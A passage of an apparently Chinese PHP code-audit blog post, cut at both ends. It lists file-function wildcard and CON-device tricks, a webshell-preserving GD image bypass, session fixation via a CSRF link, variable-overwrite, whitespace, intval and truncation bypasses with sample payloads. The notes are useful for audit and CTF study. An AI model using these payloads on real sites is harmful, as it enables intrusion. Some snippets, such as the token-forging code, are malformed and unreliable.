file</td>\n</tr>\n<tr>\n<td>5.</td>\n<td>OK</td>\n<td>fopen()</td>\n<td>Openfile</td>\n</tr>\n<tr>\n<td>6.</td>\n<td>OK</td>\n<td>ZipArchive::open()</td>\n<td>Archive file</td>\n</tr>\n<tr>\n<td>7.</td>\n<td>OK</td>\n<td>copy()</td>\n<td>Copyfile</td>\n</tr>\n<tr>\n<td>8.</td>\n<td>OK</td>\n<td>file_get_contents()</td>\n<td>Readfile</td>\n</tr>\n<tr>\n<td>9.</td>\n<td>OK</td>\n<td>parse_ini_file()</td>\n<td>Readfile</td>\n</tr>\n<tr>\n<td>10.</td>\n<td>OK</td>\n<td>readfile()</td>\n<td>Readfile</td>\n</tr>\n<tr>\n<td>11.</td>\n<td>OK</td>\n<td>file_put_contents()</td>\n<td>Write file</td>\n</tr>\n<tr>\n<td>12.</td>\n<td>OK</td>\n<td>mkdir()</td>\n<td>New directory creation</td>\n</tr>\n<tr>\n<td>13.</td>\n<td>OK</td>\n<td>tempnam()</td>\n<td>New file creation</td>\n</tr>\n<tr>\n<td>14.</td>\n<td>OK</td>\n<td>touch()</td>\n<td>New file creation</td>\n</tr>\n<tr>\n<td>15.</td>\n<td>OK</td>\n<td>move_uploaded_file()</td>\n<td>Move operation</td>\n</tr>\n<tr>\n<td>16.</td>\n<td>OK</td>\n<td>opendiit)</td>\n<td>Directory operation</td>\n</tr>\n<tr>\n<td>17.</td>\n<td>OK</td>\n<td>readdir()</td>\n<td>Directory operation</td>\n</tr>\n<tr>\n<td>18.</td>\n<td>OK</td>\n<td>rewinddir()</td>\n<td>Directory operation</td>\n</tr>\n<tr>\n<td>19.</td>\n<td>OK</td>\n<td>closedir()</td>\n<td>Directory operation</td>\n</tr>\n<tr>\n<td>20.</td>\n<td>FAIL</td>\n<td>rename()</td>\n<td>Move operation</td>\n</tr>\n<tr>\n<td>21.</td>\n<td>FAIL</td>\n<td>unlink()</td>\n<td>Delete file</td>\n</tr>\n<tr>\n<td>22.</td>\n<td>FAIL</td>\n<td>rmdir())</td>\n<td>Directory operation</td>\n</tr>\n</tbody>\n</table>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">## ?file=1&lt;</span></span><br><span class=\"line\"><span class=\"comment\">## ?file=1&gt;</span></span><br><span class=\"line\"><span class=\"comment\">## ?file=1\"txt</span></span><br><span class=\"line\">文件名为<span class=\"number\">1.</span>txt</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">## ?file=1234.tx&gt;</span></span><br><span class=\"line\"><span class=\"comment\">## ?file=1234.&lt;</span></span><br><span class=\"line\"><span class=\"comment\">## ?file=1&lt;&lt;</span></span><br><span class=\"line\"><span class=\"comment\">## ?file=1&lt;&lt;\"&gt;</span></span><br><span class=\"line\"><span class=\"comment\">## ?file=123&gt;\"&gt;</span></span><br><span class=\"line\"><span class=\"comment\">## ?file=&gt;&gt;&gt;4\"&gt;</span></span><br><span class=\"line\"><span class=\"comment\">## ?file=&lt;&lt;4\"&gt;</span></span><br><span class=\"line\">文件名为<span class=\"number\">1234.</span>txt</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">include</span>(<span class=\"string\">'shell&lt;'</span>);  </span><br><span class=\"line\"><span class=\"keyword\">include</span>(<span class=\"string\">'shell&lt;&lt;'</span>);</span><br><span class=\"line\"><span class=\"keyword\">include</span>(<span class=\"string\">'shell.p&gt;p'</span>); </span><br><span class=\"line\"><span class=\"keyword\">include</span>(<span class=\"string\">'shell\"php'</span>);</span><br><span class=\"line\">fopen(<span class=\"string\">'.htacess'</span>);  <span class=\"comment\">//==&gt;fopen(\"htacess');</span></span><br><span class=\"line\">file_get_contents(<span class=\"string\">'C:boot.ini'</span>); <span class=\"comment\">//==&gt;  file_get_contents ('C:/boot.ini');</span></span><br><span class=\"line\">file_get_contents(<span class=\"string\">'C:/tmp/con.jpg'</span>); <span class=\"comment\">//此举将会无休无止地从CON设备读取0字节，直到遇到eof</span></span><br><span class=\"line\">file_put_contents(<span class=\"string\">'C:/tmp/con.jpg'</span>,chr(<span class=\"number\">0</span>×<span class=\"number\">07</span>));  <span class=\"comment\">//此举将会不断地使服务器发出类似哔哔的声音</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"处理value没有处理key\"><a href=\"#处理value没有处理key\" class=\"headerlink\" title=\"处理value没有处理key\"></a>处理value没有处理key</h2><p>foreach时,addslashes对获得的value值进行处理，但没有处理key。</p>\n<h2 id=\"用来目录遍历的特别函数\"><a href=\"#用来目录遍历的特别函数\" class=\"headerlink\" title=\"用来目录遍历的特别函数\"></a>用来目录遍历的特别函数</h2><p><a href=\"http://wooyun.webbaozi.com/bug_detail.php?wybug_id=wooyun-2014-088094\" target=\"_blank\" rel=\"noopener\">http://wooyun.webbaozi.com/bug_detail.php?wybug_id=wooyun-2014-088094</a><br>lstat 函数</p>\n<p><a href=\"http://wooyun.webbaozi.com/bug_detail.php?wybug_id=wooyun-2014-088071\" target=\"_blank\" rel=\"noopener\">http://wooyun.webbaozi.com/bug_detail.php?wybug_id=wooyun-2014-088071</a><br>stream_resolve_include_path函数</p>\n<p><a href=\"http://wooyun.webbaozi.com/bug_detail.php?wybug_id=wooyun-2014-083688\" target=\"_blank\" rel=\"noopener\">http://wooyun.webbaozi.com/bug_detail.php?wybug_id=wooyun-2014-083688</a></p>\n<p><a href=\"http://wooyun.webbaozi.com/bug_detail.php?wybug_id=wooyun-2014-083457\" target=\"_blank\" rel=\"noopener\">http://wooyun.webbaozi.com/bug_detail.php?wybug_id=wooyun-2014-083457</a></p>\n<p><a href=\"http://wooyun.webbaozi.com/bug_detail.php?wybug_id=wooyun-2014-083453\" target=\"_blank\" rel=\"noopener\">http://wooyun.webbaozi.com/bug_detail.php?wybug_id=wooyun-2014-083453</a></p>\n<h2 id=\"绕过GD库图片渲染\"><a href=\"#绕过GD库图片渲染\" class=\"headerlink\" title=\"绕过GD库图片渲染\"></a>绕过GD库图片渲染</h2><p><a href=\"file/PHP代码审计_jpg_payload.zip\">jpg_payload.zip</a></p>\n<p>jpg_name.jpg是待GD处理的图片<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">php jpg_payload.php &lt;jpg_name.jpg&gt;</span><br></pre></td></tr></table></figure></p>\n<p>生成好的图片，在经过如下代码处理后，依然能保留其中的shell：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">    imagecreatefromjpeg(<span class=\"string\">'xxxx.jpg'</span>);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"会话固定\"><a href=\"#会话固定\" class=\"headerlink\" title=\"会话固定\"></a>会话固定</h2><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span>(!<span class=\"keyword\">empty</span>($_GET[<span class=\"string\">'phpsessid'</span>])) session_id($_GET[<span class=\"string\">'phpsessid'</span>]);<span class=\"comment\">//通过GET方法传递sessionid</span></span><br></pre></td></tr></table></figure>\n<p>通过get方法来设置session。所以可以通过CSRF：</p>\n<p><a href=\"http://xxxx/index.php?r=admin/index/index&amp;phpsessid=f4cking123\" target=\"_blank\" rel=\"noopener\">http://xxxx/index.php?r=admin/index/index&amp;phpsessid=f4cking123</a></p>\n<p>管理员点了我们就能使用此session进后台了。</p>\n<h2 id=\"end方法获取元素的问题\"><a href=\"#end方法获取元素的问题\" class=\"headerlink\" title=\"end方法获取元素的问题\"></a>end方法获取元素的问题</h2><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$file = <span class=\"keyword\">array</span>(<span class=\"number\">1</span> =&gt; <span class=\"string\">'png'</span>, <span class=\"number\">0</span> =&gt; <span class=\"string\">'php'</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">$ext = $file[count($file) - <span class=\"number\">1</span>];</span><br><span class=\"line\"></span><br><span class=\"line\">$ext = end($file);</span><br></pre></td></tr></table></figure>\n<p>两者的区别是，前者是通过下标来确定，后者则是返回数组的最后一个元素。前者返回的是$filename[1]也就是png,后者直接返回数组排在最后面的元素php。</p>\n<h2 id=\"资料\"><a href=\"#资料\" class=\"headerlink\" title=\"资料\"></a>资料</h2><p>PHP代码审计分段讲解</p>\n<p><a href=\"https://github.com/bowu678/php_bugs\" target=\"_blank\" rel=\"noopener\">https://github.com/bowu678/php_bugs</a></p>\n<p><a href=\"https://github.com/jiangsir404/Audit-Learning\" target=\"_blank\" rel=\"noopener\">https://github.com/jiangsir404/Audit-Learning</a></p>\n<p><a href=\"https://read.douban.com/reader/ebook/16642056/\" target=\"_blank\" rel=\"noopener\">https://read.douban.com/reader/ebook/16642056/</a></p>\n","site":{"data":{}},"excerpt":"<h1 id=\"PHP代码审计归纳\"><a href=\"#PHP代码审计归纳\" class=\"headerlink\" title=\"PHP代码审计归纳\"></a>PHP代码审计归纳</h1><p>Author: 木禾 ali0th</p>\n<p><a href=\"https://github.com/Martin2877/Ali0thNotes/blob/master/Code%20Audit/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%BD%92%E7%BA%B3.md\" target=\"_blank\" rel=\"noopener\">https://github.com/Martin2877/Ali0thNotes/blob/master/Code%20Audit/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%BD%92%E7%BA%B3.md</a></p>\n<h2 id=\"变量覆盖\"><a href=\"#变量覆盖\" class=\"headerlink\" title=\"变量覆盖\"></a>变量覆盖</h2><h3 id=\"extract\"><a href=\"#extract\" class=\"headerlink\" title=\"extract()\"></a>extract()</h3><p>该函数使用数组键名作为变量名，使用数组键值作为变量值。针对数组中的每个元素，将在当前符号表中创建对应的一个变量。条件：若有EXTR_SKIP则不行。<br><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">$a = <span class=\"string\">\"Original\"</span>;</span><br><span class=\"line\">$my_array = <span class=\"keyword\">array</span>(<span class=\"string\">\"a\"</span> =&gt; <span class=\"string\">\"Cat\"</span>,<span class=\"string\">\"b\"</span> =&gt; <span class=\"string\">\"Dog\"</span>, <span class=\"string\">\"c\"</span> =&gt; <span class=\"string\">\"Horse\"</span>);</span><br><span class=\"line\">extract($my_array); </span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"string\">\"\\$a = $a; \\$b = $b; \\$c = $c\"</span>;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\"><span class=\"comment\"># 结果：$a = Cat; $b = Dog; $c = Horse</span></span><br></pre></td></tr></table></figure></p>\n<p>这里原来是\\$a是original，后面通过extract把$a覆盖变成了Cat了,所以这里把原来的变量给覆盖了。</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#?shiyan=&amp;flag=1</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">$flag=<span class=\"string\">'xxx'</span>; </span><br><span class=\"line\">extract($_GET);</span><br><span class=\"line\"> <span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>($shiyan))</span><br><span class=\"line\"> &#123; </span><br><span class=\"line\">    $content=trim(file_get_contents($flag)); <span class=\"comment\"># content is 0 , flag can be anything,cause file_get_contents cannot open file, return 0</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span>($shiyan==$content)</span><br><span class=\"line\">    &#123; </span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">'ctf&#123;xxx&#125;'</span>; </span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">   <span class=\"keyword\">else</span></span><br><span class=\"line\">   &#123; </span><br><span class=\"line\">    <span class=\"keyword\">echo</span><span class=\"string\">'Oh.no'</span>;</span><br><span class=\"line\">   &#125; </span><br><span class=\"line\">   &#125;</span><br></pre></td></tr></table></figure>","more":"<h3 id=\"parse-str\"><a href=\"#parse-str\" class=\"headerlink\" title=\"parse_str()\"></a>parse_str()</h3><p>解析字符串并注册成变量<br><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$b=<span class=\"number\">1</span>;</span><br><span class=\"line\">Parse_str(<span class=\"string\">'b=2'</span>);</span><br><span class=\"line\">Print_r($b);</span><br><span class=\"line\"><span class=\"comment\"># 结果: $b=2</span></span><br></pre></td></tr></table></figure></p>\n<h3 id=\"import-request-variables\"><a href=\"#import-request-variables\" class=\"headerlink\" title=\"import_request_variables()\"></a>import_request_variables()</h3><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">将 GET/POST/Cookie 变量导入到全局作用域中，全局变量注册。</span><br><span class=\"line\">在<span class=\"number\">5.4</span>之后被取消，只可在<span class=\"number\">4</span><span class=\"number\">-4.1</span><span class=\"number\">.0</span>和<span class=\"number\">5</span><span class=\"number\">-5.4</span><span class=\"number\">.0</span>可用。</span><br><span class=\"line\"><span class=\"comment\">//导入POST提交的变量值，前缀为post_</span></span><br><span class=\"line\">import_request_variable(<span class=\"string\">\"p\"</span>， <span class=\"string\">\"post_\"</span>);</span><br><span class=\"line\"><span class=\"comment\">//导入GET和POST提交的变量值，前缀为gp_，GET优先于POST</span></span><br><span class=\"line\">import_request_variable(<span class=\"string\">\"gp\"</span>， <span class=\"string\">\"gp_\"</span>);</span><br><span class=\"line\"><span class=\"comment\">//导入Cookie和GET的变量值，Cookie变量值优先于GET</span></span><br><span class=\"line\">import_request_variable(<span class=\"string\">\"cg\"</span>， <span class=\"string\">\"cg_\"</span>);</span><br></pre></td></tr></table></figure>\n<h3 id=\"变量覆盖-1\"><a href=\"#变量覆盖-1\" class=\"headerlink\" title=\"$变量覆盖\"></a>$变量覆盖</h3><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">## 提交参数chs，则可覆盖变量\"$chs\"的值。$key为chs时，$$key就变成$chs</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?</span>  </span><br><span class=\"line\">$chs = <span class=\"string\">''</span>;  </span><br><span class=\"line\"><span class=\"keyword\">if</span>($_POST &amp;&amp; $charset != <span class=\"string\">'utf-8'</span>)&#123;  </span><br><span class=\"line\">    $chs = <span class=\"keyword\">new</span> Chinese(<span class=\"string\">'UTF-8'</span>, $charset);  </span><br><span class=\"line\">    <span class=\"keyword\">foreach</span>($_POST <span class=\"keyword\">as</span> $key =&gt; $value)&#123;  </span><br><span class=\"line\">        $$key = $chs-&gt;Convert($value);  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">    <span class=\"keyword\">unset</span>($chs);  </span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"全局变量覆盖漏洞\"><a href=\"#全局变量覆盖漏洞\" class=\"headerlink\" title=\"全局变量覆盖漏洞\"></a>全局变量覆盖漏洞</h3><p>原理：<br>register_globals 是php中的一个控制选项，可以设置成off或者on, 默认为off, 决定是否将 EGPCS（Environment，GET，POST，Cookie，Server）变量注册为全局变量。<br>如果register_globals打开的话, 客户端提交的数据中含有GLOBALS变量名, 就会覆盖服务器上的$GLOBALS变量.</p>\n<p>\\$_REQUEST 这个超全局变量的值受 php.ini中request_order的影响，在php5.3.x系列中，request_order默认值为GP，也就是说默认配置下$_REQUEST只包含$_GET和$_POST而不包括$_COOKIE。通过COOKIE就可以提交GLOBALS变量。</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"comment\">// register_globals =ON</span></span><br><span class=\"line\"><span class=\"comment\">//foo.php?GLOBALS[foobar]=HELLO</span></span><br><span class=\"line\"><span class=\"keyword\">echo</span> $foobar;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//为了安全取消全局变量</span></span><br><span class=\"line\"><span class=\"comment\">//var.php?GLOBALS[a]=aaaa&amp;b=111</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> (ini_get(<span class=\"string\">\"register_globals\"</span>)) <span class=\"keyword\">foreach</span>($_REQUEST <span class=\"keyword\">as</span> $k=&gt;$v) <span class=\"keyword\">unset</span>($&#123;$k&#125;);</span><br><span class=\"line\"><span class=\"keyword\">print</span> $a;</span><br><span class=\"line\"><span class=\"keyword\">print</span> $_GET[b];</span><br></pre></td></tr></table></figure>\n<p>经过测试，开了register_globals会卡死</p>\n<h2 id=\"绕过过滤的空白字符\"><a href=\"#绕过过滤的空白字符\" class=\"headerlink\" title=\"绕过过滤的空白字符\"></a>绕过过滤的空白字符</h2><p>原理：<a href=\"https://baike.baidu.com/item/%E6%8E%A7%E5%88%B6%E5%AD%97%E7%AC%A6\" target=\"_blank\" rel=\"noopener\">https://baike.baidu.com/item/%E6%8E%A7%E5%88%B6%E5%AD%97%E7%AC%A6</a></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">控制码</span><br><span class=\"line\">&quot;\\0&quot; &quot;%00&quot; (ASCII  0 (0x00))，空字节符。</span><br><span class=\"line\"></span><br><span class=\"line\">制表符</span><br><span class=\"line\">&quot;\\t&quot; (ASCII  9 (0x09))，水平制表符。</span><br><span class=\"line\"></span><br><span class=\"line\">空白字符：</span><br><span class=\"line\">&quot;\\n&quot; (ASCII 10 (0x0A))，换行符。</span><br><span class=\"line\">&quot;\\v&quot; &quot;\\x0b&quot; (ASCII  11 (0x0B))，垂直制表符。</span><br><span class=\"line\">&quot;\\f&quot; &quot;%0c&quot; 换页符</span><br><span class=\"line\">&quot;\\r&quot; &quot;%0d&quot;(ASCII  13 (0x0D))，回车符。</span><br><span class=\"line\"></span><br><span class=\"line\">空格:</span><br><span class=\"line\">&quot; &quot; &quot;%20&quot; (ASCII  32 (0x20))，普通空格符。</span><br></pre></td></tr></table></figure>\n<p>而trim过滤的空白字符有<br><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">string trim ( string $str [, string $character_mask = <span class=\"string\">\" \\t\\n\\r\\0\\x0B\"</span> ] )</span><br></pre></td></tr></table></figure></p>\n<p>其中缺少了\\f</p>\n<p>2 函数对空白字符的特性<br>is_numeric函数在开始判断前，会先跳过所有空白字符。这是一个特性。<br>也就是说，is_numeirc(“ \\r\\n \\t 1.2”)是会返回true的。同理，intval(“ \\r\\n \\t 12”)，也会正常返回12。</p>\n<p>案例</p>\n<p><a href=\"https://github.com/bowu678/php_bugs/blob/master/02%20%E7%BB%95%E8%BF%87%E8%BF%87%E6%BB%A4%E7%9A%84%E7%A9%BA%E7%99%BD%E5%AD%97%E7%AC%A6.php\" target=\"_blank\" rel=\"noopener\">https://github.com/bowu678/php_bugs/blob/master/02%20%E7%BB%95%E8%BF%87%E8%BF%87%E6%BB%A4%E7%9A%84%E7%A9%BA%E7%99%BD%E5%AD%97%E7%AC%A6.php</a><br><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#?number=%00%0c191</span></span><br><span class=\"line\"><span class=\"comment\"># 1 %00绕过is_numeric</span></span><br><span class=\"line\"><span class=\"comment\"># 2 \\f（也就是%0c）在数字前面，trim，intval和is_numeric都会忽略这个字符</span></span><br></pre></td></tr></table></figure></p>\n<h2 id=\"intval整数溢出\"><a href=\"#intval整数溢出\" class=\"headerlink\" title=\"intval整数溢出\"></a>intval整数溢出</h2><p>php整数上限溢出绕过intval</p>\n<p>intval 函数最大的值取决于操作系统。<br>32 位系统最大带符号的 integer 范围是 -2147483648 到 2147483647。举例，在这样的系统上， intval(‘1000000000000’) 会返回 2147483647。<br>64 位系统上，最大带符号的 integer 值是 9223372036854775807。</p>\n<h2 id=\"intval-四舍五入\"><a href=\"#intval-四舍五入\" class=\"headerlink\" title=\"intval 四舍五入\"></a>intval 四舍五入</h2><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># ?a=1024.1</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">if</span>($_GET[id]) &#123;</span><br><span class=\"line\">mysql_connect(SAE_MYSQL_HOST_M . <span class=\"string\">':'</span> . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);</span><br><span class=\"line\">mysql_select_db(SAE_MYSQL_DB);</span><br><span class=\"line\">$id = intval($_GET[id]); <span class=\"comment\">## 这里过滤只有一个intval</span></span><br><span class=\"line\">$query = @mysql_fetch_array(mysql_query(<span class=\"string\">\"select content from ctf2 where id='$id'\"</span>));</span><br><span class=\"line\"><span class=\"keyword\">if</span> ($_GET[id]==<span class=\"number\">1024</span>) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">\"&lt;p&gt;no! try again&lt;/p&gt;\"</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  <span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span>($query[content]);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"浮点数精度忽略\"><a href=\"#浮点数精度忽略\" class=\"headerlink\" title=\"浮点数精度忽略\"></a>浮点数精度忽略</h2><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> ($req[<span class=\"string\">\"number\"</span>] != intval($req[<span class=\"string\">\"number\"</span>]))</span><br></pre></td></tr></table></figure>\n<p>在小数小于某个值（10^-16）以后，再比较的时候就分不清大小了。<br>输入number = 1.00000000000000010, 右边变成1.0, 而左与右比较会相等。</p>\n<h2 id=\"多重加密\"><a href=\"#多重加密\" class=\"headerlink\" title=\"多重加密\"></a>多重加密</h2><p>题目中有：<br><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$login = unserialize(gzuncompress(base64_decode($requset[<span class=\"string\">'token'</span>])));</span><br><span class=\"line\"><span class=\"keyword\">if</span>($login[<span class=\"string\">'user'</span>] === <span class=\"string\">'ichunqiu'</span>)&#123;<span class=\"keyword\">echo</span> $flag;&#125;</span><br></pre></td></tr></table></figure></p>\n<p>本地则写：<br><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">$arr = <span class=\"keyword\">array</span>([<span class=\"string\">'user'</span>] === <span class=\"string\">'ichunqiu'</span>);</span><br><span class=\"line\">$token = base64_encode(gzcompress(serialize($arr)));</span><br><span class=\"line\">print_r($token);</span><br><span class=\"line\"><span class=\"comment\">// 得到eJxLtDK0qs60MrBOAuJaAB5uBBQ=</span></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure></p>\n<h2 id=\"截断\"><a href=\"#截断\" class=\"headerlink\" title=\"截断\"></a>截断</h2><h3 id=\"iconv-异常字符截断\"><a href=\"#iconv-异常字符截断\" class=\"headerlink\" title=\"iconv 异常字符截断\"></a>iconv 异常字符截断</h3><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">## 因iconv遇到异常字符就不转后面的内容了，所以可以截断。</span></span><br><span class=\"line\"><span class=\"comment\">## 这里chr(128)到chr(255)都可以截断。</span></span><br><span class=\"line\">$a=<span class=\"string\">'1'</span>.char(<span class=\"number\">130</span>).<span class=\"string\">'2'</span>;</span><br><span class=\"line\"><span class=\"keyword\">echo</span> iconv(<span class=\"string\">\"UTF-8\"</span>,<span class=\"string\">\"gbk\"</span>,$a); <span class=\"comment\">//将字符串的编码从UTF-8转到gbk</span></span><br><span class=\"line\"><span class=\"keyword\">echo</span> iconv(<span class=\"string\">'GB2312'</span>, <span class=\"string\">'UTF-8'</span>, $str); <span class=\"comment\">//将字符串的编码从GB2312转到UTF-8</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"eregi、ereg可用-00截断\"><a href=\"#eregi、ereg可用-00截断\" class=\"headerlink\" title=\"eregi、ereg可用%00截断\"></a>eregi、ereg可用%00截断</h3><p>功能：正则匹配过滤<br>条件：要求php&lt;5.3.4</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">## http://127.0.0.1/Php_Bug/05.php?password=1e9%00*-*</span></span><br><span class=\"line\"><span 